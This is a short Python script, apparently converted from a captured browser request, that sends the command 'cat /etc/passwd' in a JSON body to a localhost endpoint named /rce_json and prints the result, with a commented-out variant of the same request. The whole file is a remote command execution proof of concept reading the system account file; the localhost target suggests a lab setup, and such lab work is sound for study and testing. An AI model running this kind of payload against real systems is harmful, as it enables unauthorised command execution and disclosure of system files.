import requests

headers = {
    'Host': 'localhost:9001',
    'Content-Length': '25',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'http://localhost:9001',
    'Referer': 'http://localhost:9001/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
    'Connection': 'close',
}

json_data = {
    'cmd': 'cat /etc/passwd',
}

response = requests.post('http://localhost:8001/rce_json', headers=headers, json=json_data, verify=False)
print(response.text)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"cmd":"cat /etc/passwd"}'
#response = requests.post('http://localhost:9001/rce_json', headers=headers, data=data, verify=False)